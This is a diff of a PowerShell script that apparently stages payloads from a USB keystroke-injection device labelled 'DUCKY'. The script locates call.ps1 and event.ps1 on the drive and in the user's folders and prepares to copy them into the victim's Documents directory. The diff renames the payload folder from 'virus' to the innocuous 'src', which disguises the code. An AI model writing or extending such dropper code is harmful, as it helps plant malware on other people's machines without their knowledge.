@@ -11,14 +11,14 @@ $localUsername = $env:USERNAME
 
 $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
 
-$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\* -Recurse -Filter "virus\call.ps1"
-$callPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus
+$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\* -Recurse -Filter "src\call.ps1"
+$callPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\src
 
-$callMoveDir = "C:\Users\$localUsername\Document\virus\call.ps1"
+$callMoveDir = "C:\Users\$localUsername\Document\src\call.ps1"
 
-$eventPathBeforeCopy = Get-ChildItem -Path $driveletter\virus -Recurse -Filter "event.ps1"
-$eventPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus -Recurse -Filter "event.ps1"
-$eventMoveDir = "C:\Users\$localUsername\Document\virus\event.ps1"
+$eventPathBeforeCopy = Get-ChildItem -Path $driveletter\src -Recurse -Filter "event.ps1"
+$eventPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\src -Recurse -Filter "event.ps1"
+$eventMoveDir = "C:\Users\$localUsername\Document\src\event.ps1"
 
 
 If ($driveLetter){
